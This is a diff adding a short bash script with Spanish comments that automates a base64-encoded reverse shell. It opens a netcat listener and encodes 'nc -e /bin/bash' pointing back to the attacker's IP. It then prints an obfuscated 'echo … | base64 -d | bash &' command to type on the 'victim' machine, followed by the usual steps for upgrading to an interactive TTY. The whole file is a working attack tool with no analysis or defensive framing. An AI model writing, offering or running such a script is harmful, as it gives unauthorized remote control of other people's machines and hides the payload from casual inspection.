@@ -1,0 +1,43 @@
+#!/bin/bash
+#
+#ReverseShell en base64.
+#
+#
+
+ipx=`hostname -I`
+
+if [[ -z $1 ]] ; then
+	echo " "
+	echo "[*]base64shell (+) <Puerto escucha>."
+	echo " "
+	exit
+fi
+
+echo " "
+echo "[*]Abriendo puerto de escucha..."
+echo " "
+xterm -e zsh -c "nc -nlvp $1" & 
+echo " "
+shellinv=`echo "nc -e /bin/bash $ipx $1" | base64`
+echo "[+]Escriba en la máquina víctima --> echo $shellinv | base64 -d | bash &"
+echo " "
+echo "[*]Si quiere shell interactiva: "
+echo " "
+sleep 1
+echo "[1]script /dev/null -c bash"
+echo " "
+sleep 1
+echo "[2]ctrl + z"
+echo " "
+sleep 1
+echo "[3]stty raw -echo; fg"
+echo " "
+sleep 1
+echo "[4]xterm"
+echo " "
+sleep 1
+echo "[5]export TERM=xterm"
+echo " "
+sleep 1
+echo "[6]export SHELL=bash"
+echo " "
